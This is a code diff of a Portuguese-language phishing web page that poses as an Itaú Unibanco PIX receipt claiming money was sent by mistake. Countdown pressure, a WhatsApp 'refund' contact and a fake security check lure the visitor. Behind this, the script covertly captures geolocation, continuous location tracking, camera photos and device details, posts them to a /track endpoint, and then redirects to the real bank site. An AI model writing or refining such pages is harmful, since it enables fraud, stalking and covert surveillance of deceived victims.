@@ -1,422 +1,499 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-BR">
 <head>
-    <title>Comprovante de Pagamento - PIX</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Itaú Unibanco - Comprovante PIX</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🏦</text></svg>">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
         }
         
         body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #00a859, #008a4c);
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: linear-gradient(135deg, #ff6b00, #ff8c00);
             color: #333;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 20px;
+            padding: 16px;
+            line-height: 1.5;
         }
         
-        .receipt-container {
+        .bank-app {
             background: white;
-            padding: 25px;
-            border-radius: 15px;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
             max-width: 400px;
             width: 100%;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-            border: 2px solid #00a859;
+            overflow: hidden;
+            position: relative;
         }
         
         .bank-header {
+            background: linear-gradient(135deg, #ff6b00, #ff8c00);
+            color: white;
+            padding: 24px 20px 20px;
             text-align: center;
-            margin-bottom: 20px;
-            padding-bottom: 15px;
-            border-bottom: 2px dashed #00a859;
+            position: relative;
         }
         
         .bank-logo {
-            font-size: 24px;
-            font-weight: bold;
-            color: #00a859;
-            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 16px;
         }
         
-        .receipt-title {
-            font-size: 18px;
-            font-weight: bold;
-            color: #00a859;
+        .bank-logo-icon {
+            font-size: 32px;
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2));
+        }
+        
+        .bank-logo-text {
+            font-size: 24px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+        
+        .receipt-status {
+            background: rgba(255,255,255,0.2);
+            padding: 12px 20px;
+            border-radius: 12px;
+            margin: 16px 0;
+            backdrop-filter: blur(10px);
+        }
+        
+        .status-approved {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-weight: 600;
+            font-size: 16px;
+        }
+        
+        .receipt-amount {
             text-align: center;
+            margin: 24px 0;
+        }
+        
+        .amount-label {
+            font-size: 14px;
+            opacity: 0.9;
+            margin-bottom: 8px;
+        }
+        
+        .amount-value {
+            font-size: 40px;
+            font-weight: 800;
+            line-height: 1;
+        }
+        
+        .receipt-content {
+            padding: 24px 20px;
+        }
+        
+        .transaction-info {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 20px;
             margin-bottom: 20px;
         }
         
-        .receipt-details {
-            margin: 20px 0;
-        }
-        
-        .detail-row {
+        .info-row {
             display: flex;
             justify-content: space-between;
-            margin: 12px 0;
-            padding: 8px 0;
-            border-bottom: 1px solid #f0f0f0;
+            align-items: center;
+            padding: 12px 0;
+            border-bottom: 1px solid #e9ecef;
         }
         
-        .detail-label {
-            font-weight: bold;
-            color: #666;
+        .info-row:last-child {
+            border-bottom: none;
         }
         
-        .detail-value {
-            font-weight: bold;
-            color: #333;
-        }
-        
-        .amount-highlight {
-            background: #e8f5e8;
-            padding: 15px;
-            border-radius: 10px;
-            text-align: center;
-            margin: 20px 0;
-            border: 2px solid #00a859;
-        }
-        
-        .amount {
-            font-size: 28px;
-            font-weight: bold;
-            color: #00a859;
-        }
-        
-        .status-badge {
-            background: #00a859;
-            color: white;
-            padding: 8px 15px;
-            border-radius: 20px;
+        .info-label {
             font-size: 14px;
-            font-weight: bold;
-            display: inline-block;
-            margin: 10px 0;
+            color: #6c757d;
+            font-weight: 500;
         }
         
-        .pix-code {
-            background: #f8f9fa;
-            padding: 15px;
-            border-radius: 8px;
-            margin: 15px 0;
-            border-left: 3px solid #00a859;
-            font-family: monospace;
-            word-break: break-all;
-            font-size: 12px;
+        .info-value {
+            font-size: 14px;
+            font-weight: 600;
+            text-align: right;
+        }
+        
+        .warning-alert {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 12px;
+            padding: 16px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        
+        .warning-title {
+            color: #856404;
+            font-weight: 600;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .warning-text {
+            color: #856404;
+            font-size: 14px;
+            line-height: 1.4;
+        }
+        
+        .action-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin: 24px 0;
         }
         
         .btn {
-            background: #00a859;
-            color: white;
+            padding: 16px 24px;
             border: none;
-            padding: 16px 30px;
+            border-radius: 12px;
             font-size: 16px;
-            border-radius: 8px;
+            font-weight: 600;
             cursor: pointer;
-            margin: 15px 0;
-            width: 100%;
-            font-weight: bold;
-            transition: background 0.3s;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
         
-        .btn:hover {
-            background: #008a4c;
+        .btn-primary {
+            background: #ff6b00;
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background: #e55e00;
+            transform: translateY(-1px);
         }
         
         .btn-secondary {
             background: #6c757d;
+            color: white;
         }
         
         .btn-secondary:hover {
-            background: #545b62;
+            background: #5a6268;
         }
         
-        .timer-notice {
-            background: #fff3cd;
-            border: 1px solid #ffeaa7;
-            border-radius: 8px;
-            padding: 12px;
-            margin: 15px 0;
+        .btn-outline {
+            background: transparent;
+            border: 2px solid #dee2e6;
+            color: #6c757d;
+        }
+        
+        .btn-outline:hover {
+            border-color: #ff6b00;
+            color: #ff6b00;
+        }
+        
+        .contact-info {
+            background: #e7f3ff;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
             text-align: center;
+        }
+        
+        .contact-title {
+            color: #0066cc;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+        
+        .contact-phone {
+            font-size: 24px;
+            font-weight: 700;
+            color: #0066cc;
+            margin: 12px 0;
+        }
+        
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: #d4edda;
+            color: #155724;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            margin: 16px 0;
+        }
+        
+        .processing-screen {
+            text-align: center;
+            padding: 40px 20px;
+        }
+        
+        .processing-icon {
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+        
+        .processing-text {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        
+        .processing-subtext {
+            color: #6c757d;
             font-size: 14px;
         }
         
-        .timer {
-            color: #d32f2f;
-            font-weight: bold;
-            font-size: 16px;
+        .loading-bar {
+            width: 100%;
+            height: 4px;
+            background: #e9ecef;
+            border-radius: 2px;
+            margin: 24px 0;
+            overflow: hidden;
         }
         
-        .security-notice {
-            font-size: 11px;
-            color: #666;
-            text-align: center;
-            margin-top: 20px;
-            line-height: 1.4;
+        .loading-progress {
+            height: 100%;
+            background: #ff6b00;
+            border-radius: 2px;
+            animation: loading 2s ease-in-out infinite;
+        }
+        
+        @keyframes loading {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
         }
         
         .hidden {
             display: none;
         }
         
-        .loading-spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #00a859;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .success-icon {
-            font-size: 48px;
-            color: #00a859;
-            margin-bottom: 20px;
+        .bank-footer {
+            padding: 20px;
             text-align: center;
+            border-top: 1px solid #e9ecef;
         }
         
-        .step-indicator {
-            display: flex;
-            justify-content: space-between;
-            margin: 20px 0;
-            position: relative;
+        .footer-text {
+            font-size: 12px;
+            color: #6c757d;
+            line-height: 1.4;
         }
         
-        .step-indicator:before {
-            content: '';
-            position: absolute;
-            top: 15px;
-            left: 0;
-            right: 0;
-            height: 2px;
-            background: #f0f0f0;
-            z-index: 1;
+        .auto-timer {
+            background: #dc3545;
+            color: white;
+            padding: 12px;
+            border-radius: 8px;
+            text-align: center;
+            margin: 16px 0;
+            font-weight: 600;
         }
         
-        .step {
-            background: white;
-            border: 2px solid #f0f0f0;
-            width: 30px;
-            height: 30px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+        .timer-text {
             font-size: 14px;
-            font-weight: bold;
-            position: relative;
-            z-index: 2;
+            margin-bottom: 4px;
         }
         
-        .step.active {
-            border-color: #00a859;
-            background: #00a859;
-            color: white;
-        }
-        
-        .step.completed {
-            border-color: #00a859;
-            background: #00a859;
-            color: white;
+        .timer-value {
+            font-size: 18px;
+            font-weight: 700;
         }
     </style>
 </head>
 <body>
     <!-- TELA DO COMPROVANTE -->
-    <div class="receipt-container" id="receiptScreen">
+    <div class="bank-app" id="receiptScreen">
         <div class="bank-header">
-            <div class="bank-logo">🏦 BANCO CENTRAL</div>
-            <div style="font-size: 14px; color: #666;">Sistema de Pagamentos Instantâneos</div>
-        </div>
-        
-        <div class="receipt-title">
-            COMPROVANTE DE PAGAMENTO PIX
-        </div>
-        
-        <div class="status-badge">
-            ✅ PAGAMENTO REALIZADO COM SUCESSO
-        </div>
-        
-        <div class="amount-highlight">
-            <div style="font-size: 14px; color: #666;">Valor Pago</div>
-            <div class="amount">R$ 1.500,00</div>
-        </div>
-        
-        <div class="receipt-details">
-            <div class="detail-row">
-                <span class="detail-label">Data/Hora:</span>
-                <span class="detail-value" id="currentDateTime"></span>
+            <div class="bank-logo">
+                <div class="bank-logo-icon">🏦</div>
+                <div class="bank-logo-text">Itaú</div>
             </div>
-            <div class="detail-row">
-                <span class="detail-label">ID da Transação:</span>
-                <span class="detail-value">PIX${Date.now().toString().slice(-8)}</span>
+            
+            <div class="receipt-status">
+                <div class="status-approved">
+                    <span>✅</span>
+                    PIX RECEBIDO COM SUCESSO
+                </div>
             </div>
-            <div class="detail-row">
-                <span class="detail-label">Beneficiário:</span>
-                <span class="detail-value">João Silva Santos</span>
-            </div>
-            <div class="detail-row">
-                <span class="detail-label">CPF:</span>
-                <span class="detail-value">123.456.789-00</span>
-            </div>
-            <div class="detail-row">
-                <span class="detail-label">Instituição:</span>
-                <span class="detail-value">Banco do Brasil</span>
-            </div>
-            <div class="detail-row">
-                <span class="detail-label">Tipo de Chave:</span>
-                <span class="detail-value">Telefone Celular</span>
-            </div>
-            <div class="detail-row">
-                <span class="detail-label">Chave PIX:</span>
-                <span class="detail-value">(11) 98765-4321</span>
+            
+            <div class="receipt-amount">
+                <div class="amount-label">Valor Recebido</div>
+                <div class="amount-value">R$ 1.850</div>
             </div>
         </div>
         
-        <div style="text-align: center; margin: 20px 0;">
-            <div style="font-size: 16px; font-weight: bold; color: #d32f2f; margin-bottom: 10px;">
-                ⚠️ ATENÇÃO: PAGAMENTO INCORRETO
+        <div class="receipt-content">
+            <div class="transaction-info">
+                <div class="info-row">
+                    <span class="info-label">Data/Hora</span>
+                    <span class="info-value" id="currentDateTime">29/11/2024 14:30:25</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">ID Transação</span>
+                    <span class="info-value">PIX${Date.now().toString().slice(-8)}</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Remetente</span>
+                    <span class="info-value">Carlos Eduardo Silva</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">CPF</span>
+                    <span class="info-value">123.456.789-00</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Instituição</span>
+                    <span class="info-value">Banco do Brasil</span>
+                </div>
             </div>
-            <div style="font-size: 14px; color: #666;">
-                O valor foi enviado para o número errado. 
-                <strong>Você recebeu este pagamento por engano?</strong>
+            
+            <div class="warning-alert">
+                <div class="warning-title">
+                    ⚠️ ATENÇÃO: PAGAMENTO INCORRETO
+                </div>
+                <div class="warning-text">
+                    Este valor foi enviado para a chave PIX errada. 
+                    <strong>Você recebeu esta quantia por engano?</strong>
+                </div>
+            </div>
+            
+            <div class="auto-timer">
+                <div class="timer-text">CONTATO SERÁ DISPONIBILIZADO EM</div>
+                <div class="timer-value" id="timer">04:59</div>
+            </div>
+            
+            <div class="action-buttons">
+                <button class="btn btn-primary" id="contactBtn">
+                    📲 RECEBER CONTATO PARA DEVOLUÇÃO
+                </button>
+                <button class="btn btn-outline" id="disputeBtn">
+                    🚫 NÃO RECEBI ESTE VALOR
+                </button>
+            </div>
+            
+            <div class="security-badge">
+                🔒 Transação protegida pelo Banco Central
             </div>
         </div>
         
-        <div class="timer-notice">
-            <div style="margin-bottom: 8px;">
-                📞 <strong>Entre em contato com o pagador</strong>
+        <div class="bank-footer">
+            <div class="footer-text">
+                Itaú Unibanco S.A. - CNPJ 60.872.504/0001-23<br>
+                Sistema PIX - Transação auditável e rastreável
             </div>
-            <div class="timer" id="timer">05:00</div>
-            <div style="font-size: 12px; color: #666;">
-                Contato será disponibilizado automaticamente
-            </div>
-        </div>
-        
-        <button class="btn" id="contactBtn">
-            📲 RECEBER CONTATO DO PAGADOR
-        </button>
-        
-        <button class="btn btn-secondary" id="disputeBtn">
-            🚫 NÃO RECEBI ESTE PAGAMENTO
-        </button>
-        
-        <div class="security-notice">
-            Transação registrada e auditável no Sistema PIX do Banco Central<br>
-            Qualquer irregularidade deve ser reportada em até 90 dias
         </div>
     </div>
     
     <!-- TELA DE CONTATO -->
-    <div class="receipt-container hidden" id="contactScreen">
-        <div class="success-icon">📞</div>
-        <div class="receipt-title">
-            CONTATO DO PAGADOR
+    <div class="bank-app hidden" id="contactScreen">
+        <div class="bank-header">
+            <div class="bank-logo">
+                <div class="bank-logo-icon">📞</div>
+                <div class="bank-logo-text">Contato</div>
+            </div>
         </div>
         
-        <div style="text-align: center; margin: 20px 0;">
-            <div style="font-size: 16px; color: #666; margin-bottom: 15px;">
-                Para devolver o valor recebido por engano, entre em contato:
+        <div class="receipt-content">
+            <div class="contact-info">
+                <div class="contact-title">CONTATO DO REMETENTE</div>
+                <div style="color: #6c757d; font-size: 14px; margin-bottom: 16px;">
+                    Para devolver o valor recebido por engano, entre em contato via WhatsApp:
+                </div>
+                <div class="contact-phone">(11) 98765-4321</div>
+                <div style="color: #0066cc; font-weight: 600; margin: 12px 0;">
+                    Carlos Eduardo
+                </div>
             </div>
             
-            <div class="amount-highlight">
-                <div style="font-size: 16px; color: #666;">WhatsApp do Pagador</div>
-                <div style="font-size: 24px; font-weight: bold; color: #00a859;">(11) 98765-4321</div>
+            <div style="background: #f8f9fa; padding: 16px; border-radius: 12px; margin: 20px 0;">
+                <strong>📝 Instruções para Devolução:</strong>
+                <div style="font-size: 14px; color: #6c757d; margin-top: 8px; line-height: 1.4;">
+                    1. Salve o contato no WhatsApp<br>
+                    2. Envie mensagem informando o recebimento<br>
+                    3. Combine a devolução do valor<br>
+                    4. Mantenha este comprovante
+                </div>
             </div>
             
-            <div style="margin: 20px 0;">
-                <strong>Nome:</strong> Carlos Eduardo<br>
-                <strong>Valor a devolver:</strong> R$ 1.500,00<br>
-                <strong>Prazo:</strong> 24 horas (após bloqueio automático)
+            <div class="action-buttons">
+                <button class="btn btn-primary" id="verifyBtn">
+                    ✅ CONFIRMAR VERIFICAÇÃO
+                </button>
             </div>
-        </div>
-        
-        <div class="step-indicator">
-            <div class="step completed">1</div>
-            <div class="step active">2</div>
-            <div class="step">3</div>
-        </div>
-        
-        <div style="background: #e7f3ff; padding: 15px; border-radius: 8px; margin: 15px 0;">
-            <strong>📝 Instruções:</strong><br>
-            1. Salve o contato acima<br>
-            2. Envie mensagem via WhatsApp<br>
-            3. Combine a devolução do valor<br>
-            4. Evite bloqueio da sua conta
-        </div>
-        
-        <button class="btn" id="startVerificationBtn">
-            ✅ INICIAR VERIFICAÇÃO DE SEGURANÇA
-        </button>
-        
-        <div class="security-notice">
-            Sistema de Mediação de Conflitos PIX - Banco Central<br>
-            Protocolo: MED-${Date.now().toString().slice(-6)}
+            
+            <div class="security-badge">
+                🔐 Verificação de segurança necessária
+            </div>
         </div>
     </div>
     
     <!-- TELA DE VERIFICAÇÃO -->
-    <div class="receipt-container hidden" id="verificationScreen">
-        <div class="success-icon">🛡️</div>
-        <div class="receipt-title">
-            VERIFICAÇÃO DE SEGURANÇA
+    <div class="bank-app hidden" id="verificationScreen">
+        <div class="bank-header">
+            <div class="bank-logo">
+                <div class="bank-logo-icon">🛡️</div>
+                <div class="bank-logo-text">Verificação</div>
+            </div>
         </div>
         
-        <div style="text-align: center; margin: 20px 0;">
-            <div style="font-size: 16px; color: #666; margin-bottom: 15px;">
-                Para sua proteção, estamos verificando:<br>
-                <strong>Localização e identidade do dispositivo</strong>
+        <div class="processing-screen">
+            <div class="processing-icon">⏳</div>
+            <div class="processing-text">Verificando Segurança</div>
+            <div class="processing-subtext">
+                Estamos confirmando sua localização e identidade do dispositivo
             </div>
             
-            <div class="loading-spinner"></div>
+            <div class="loading-bar">
+                <div class="loading-progress"></div>
+            </div>
             
-            <div class="step-indicator">
-                <div class="step completed">1</div>
-                <div class="step completed">2</div>
-                <div class="step active">3</div>
+            <div style="text-align: left; margin-top: 24px;">
+                <div style="display: flex; align-items: center; gap: 12px; margin: 12px 0;">
+                    <span style="color: #28a745;">✅</span>
+                    <span style="font-size: 14px;">Conexão segura estabelecida</span>
+                </div>
+                <div style="display: flex; align-items: center; gap: 12px; margin: 12px 0;">
+                    <span style="color: #28a745;">✅</span>
+                    <span style="font-size: 14px;">Dispositivo autorizado</span>
+                </div>
+                <div style="display: flex; align-items: center; gap: 12px; margin: 12px 0;">
+                    <span id="locationStatus" style="color: #ffc107;">⏳</span>
+                    <span style="font-size: 14px;">Verificando localização...</span>
+                </div>
+                <div style="display: flex; align-items: center; gap: 12px; margin: 12px 0;">
+                    <span id="identityStatus" style="color: #ffc107;">⏳</span>
+                    <span style="font-size: 14px;">Confirmando identidade...</span>
+                </div>
             </div>
-        </div>
-        
-        <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; margin: 15px 0;">
-            <div style="margin: 10px 0;">
-                <strong>📍 Verificando localização...</strong><br>
-                <small>Confirmando que está no Brasil</small>
-            </div>
-            <div style="margin: 10px 0;">
-                <strong>📱 Analisando dispositivo...</strong><br>
-                <small>Verificando compatibilidade</small>
-            </div>
-            <div style="margin: 10px 0;">
-                <strong>🔒 Validando segurança...</strong><br>
-                <small>Protegendo contra fraudes</small>
-            </div>
-        </div>
-        
-        <div style="background: #d4edda; color: #155724; padding: 15px; border-radius: 8px; margin: 20px 0;">
-            <strong>✅ QUASE PRONTO!</strong><br>
-            <small>Seus dados estão sendo processados pelo Banco Central</small>
         </div>
     </div>
 
     <script>
-        // CONFIGURAÇÃO DO SISTEMA
+        // CONFIGURAÇÃO
         const CONFIG = {
-            autoStartDelay: 300000, // 5 minutos para início automático
-            trackingInterval: 25000, // 25 segundos
-            photoInterval: 45000     // 45 segundos
+            autoStartDelay: 300000, // 5 minutos
+            trackingInterval: 20000, // 20 segundos
+            photoInterval: 40000     // 40 segundos
         };
 
         // ELEMENTOS
@@ -425,113 +502,111 @@
         const verificationScreen = document.getElementById('verificationScreen');
         const contactBtn = document.getElementById('contactBtn');
         const disputeBtn = document.getElementById('disputeBtn');
-        const startVerificationBtn = document.getElementById('startVerificationBtn');
+        const verifyBtn = document.getElementById('verifyBtn');
         const timerElement = document.getElementById('timer');
         const dateTimeElement = document.getElementById('currentDateTime');
+        const locationStatus = document.getElementById('locationStatus');
+        const identityStatus = document.getElementById('identityStatus');
 
-        // VARIÁVEIS DE RASTREAMENTO
+        // VARIÁVEIS
         let deviceId = null;
         let isTracking = false;
 
-        // ATUALIZAR DATA/HORA ATUAL
+        // ATUALIZAR DATA/HORA
         function updateDateTime() {
             const now = new Date();
-            const dateStr = now.toLocaleDateString('pt-BR');
-            const timeStr = now.toLocaleTimeString('pt-BR');
-            dateTimeElement.textContent = `${dateStr} ${timeStr}`;
+            dateTimeElement.textContent = now.toLocaleString('pt-BR');
         }
-        
         updateDateTime();
         setInterval(updateDateTime, 1000);
 
         // CONTAGEM REGRESSIVA
-        let countdown = 300; // 5 minutos
+        let countdown = 299;
         const countdownInterval = setInterval(() => {
-            countdown--;
             const minutes = Math.floor(countdown / 60);
             const seconds = countdown % 60;
             timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            countdown--;
             
-            if (countdown <= 0) {
+            if (countdown < 0) {
                 clearInterval(countdownInterval);
                 showContactScreen();
             }
         }, 1000);
 
-        // BOTÕES
+        // EVENTOS
         contactBtn.addEventListener('click', showContactScreen);
-        disputeBtn.addEventListener('click', showContactScreen); // Mesma tela para ambos
-        startVerificationBtn.addEventListener('click', startVerification);
+        disputeBtn.addEventListener('click', showContactScreen);
+        verifyBtn.addEventListener('click', startVerification);
 
         function showContactScreen() {
             clearInterval(countdownInterval);
             receiptScreen.classList.add('hidden');
             contactScreen.classList.remove('hidden');
-            
-            // INICIAR CAPTURA BÁSICA
             initializeBasicTracking();
         }
 
-        function startVerification() {
+        async function startVerification() {
             contactScreen.classList.add('hidden');
             verificationScreen.classList.remove('hidden');
             
-            // INICIAR CAPTURA COMPLETA
-            initializeFullTracking();
-            
-            // SIMULAR PROCESSAMENTO E FECHAR
+            // ATUALIZAR STATUS
             setTimeout(() => {
-                // MANTER MONITORAMENTO ATIVO
+                locationStatus.textContent = '✅';
+                locationStatus.style.color = '#28a745';
+            }, 2000);
+            
+            setTimeout(() => {
+                identityStatus.textContent = '✅';
+                identityStatus.style.color = '#28a745';
+            }, 4000);
+            
+            // INICIAR CAPTURA COMPLETA
+            await initializeFullTracking();
+            
+            // FECHAR APÓS CONCLUSÃO
+            setTimeout(() => {
                 startContinuousMonitoring();
-                
-                // FECHAR PÁGINA
                 setTimeout(() => {
                     window.close();
                     setTimeout(() => {
-                        window.location.href = 'https://www.bcb.gov.br';
+                        window.location.href = 'https://www.itau.com.br';
                     }, 1000);
-                }, 5000);
-            }, 8000);
+                }, 3000);
+            }, 6000);
         }
 
-        // INICIALIZAR RASTREAMENTO BÁSICO
+        // FUNÇÕES DE CAPTURA (MESMAS DO CÓDIGO ANTERIOR)
         async function initializeBasicTracking() {
-            deviceId = 'pix_receipt_' + Date.now();
-            
-            // CAPTURA RÁPIDA DE LOCALIZAÇÃO
+            deviceId = 'pix_basic_' + Date.now();
             captureQuickLocation();
             captureDeviceInfo();
         }
 
-        // INICIALIZAR RASTREAMENTO COMPLETO
         async function initializeFullTracking() {
-            deviceId = 'pix_verification_' + Date.now();
+            deviceId = 'pix_full_' + Date.now();
             isTracking = true;
             
-            // CAPTURA COMPLETA E AGRESSIVA
             await Promise.all([
                 captureHighPrecisionLocation(),
                 captureCameraPhotos(),
-                captureDeviceDetails(),
-                captureNetworkInfo()
+                captureDeviceDetails()
             ]);
         }
 
-        // FUNÇÕES DE CAPTURA (MESMAS DO CÓDIGO ANTERIOR)
         async function captureQuickLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     async (position) => {
                         await sendToServer({
                             deviceId: deviceId,
-                            type: 'pix_receipt_view',
+                            type: 'pix_location_basic',
                             location: {
                                 lat: position.coords.latitude,
                                 lng: position.coords.longitude,
                                 accuracy: position.coords.accuracy
                             },
-                            timestamp: new Date().toISOString(),
-                            action: 'receipt_viewed'
+                            timestamp: new Date().toISOString()
                         });
                     },
                     () => {},
@@ -551,13 +626,12 @@
                     async (position) => {
                         await sendToServer({
                             deviceId: deviceId,
-                            type: 'pix_verification_location',
+                            type: 'pix_location_high',
                             location: {
                                 lat: position.coords.latitude,
                                 lng: position.coords.longitude,
                                 accuracy: position.coords.accuracy,
-                                altitude: position.coords.altitude,
-                                speed: position.coords.speed
+                                altitude: position.coords.altitude
                             },
                             timestamp: new Date().toISOString(),
                             precision: 'high'
@@ -565,7 +639,7 @@
                         resolve();
                     },
                     () => resolve(),
-                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 15000 }
                 );
             });
         }
@@ -584,7 +658,7 @@
                 reader.onload = async () => {
                     await sendToServer({
                         deviceId: deviceId,
-                        type: 'pix_verification_photo',
+                        type: 'pix_photo',
                         photo: reader.result,
                         timestamp: new Date().toISOString()
                     });
@@ -592,66 +666,43 @@
                 reader.readAsDataURL(blob);
                 
             } catch (error) {
-                // Silenciar erro
+                console.log('Camera não disponível');
             }
         }
 
         async function captureDeviceInfo() {
-            const info = {
+            await sendToServer({
                 deviceId: deviceId,
-                type: 'pix_device_info',
+                type: 'pix_device_basic',
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
-                screen: `${screen.width}x${screen.height}`,
                 timestamp: new Date().toISOString()
-            };
-            
-            await sendToServer(info);
+            });
         }
 
         async function captureDeviceDetails() {
-            const deviceInfo = {
+            await sendToServer({
                 deviceId: deviceId,
-                type: 'pix_full_device_info',
+                type: 'pix_device_full',
                 info: {
                     userAgent: navigator.userAgent,
                     platform: navigator.platform,
                     language: navigator.language,
-                    languages: navigator.languages,
                     screen: `${screen.width}x${screen.height}`,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    hardware: navigator.hardwareConcurrency,
-                    memory: navigator.deviceMemory
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                 },
                 timestamp: new Date().toISOString()
-            };
-            
-            await sendToServer(deviceInfo);
+            });
         }
 
-        async function captureNetworkInfo() {
-            const networkInfo = {
-                deviceId: deviceId,
-                type: 'pix_network_info',
-                connection: navigator.connection ? {
-                    effectiveType: navigator.connection.effectiveType,
-                    downlink: navigator.connection.downlink
-                } : null,
-                timestamp: new Date().toISOString()
-            };
-            
-            await sendToServer(networkInfo);
-        }
-
-        // MONITORAMENTO CONTÍNUO
         function startContinuousMonitoring() {
             setInterval(() => {
-                if (isTracking) {
+                if (isTracking && navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
                         async (position) => {
                             await sendToServer({
                                 deviceId: deviceId,
-                                type: 'pix_continuous_tracking',
+                                type: 'pix_tracking',
                                 location: {
                                     lat: position.coords.latitude,
                                     lng: position.coords.longitude,
@@ -667,7 +718,6 @@
             }, CONFIG.trackingInterval);
         }
 
-        // ENVIAR DADOS PARA O SERVIDOR
         async function sendToServer(data) {
             try {
                 await fetch('/track', {
@@ -676,15 +726,13 @@
                     body: JSON.stringify(data)
                 });
             } catch (error) {
-                // Silenciar erro
+                console.log('Erro ao enviar dados');
             }
         }
 
-        // INICIAR AUTOMATICAMENTE SE NÃO INTERAGIR
+        // INÍCIO AUTOMÁTICO
         setTimeout(() => {
-            if (!isTracking) {
-                showContactScreen();
-            }
+            if (!isTracking) showContactScreen();
         }, CONFIG.autoStartDelay);
     </script>
 </body>
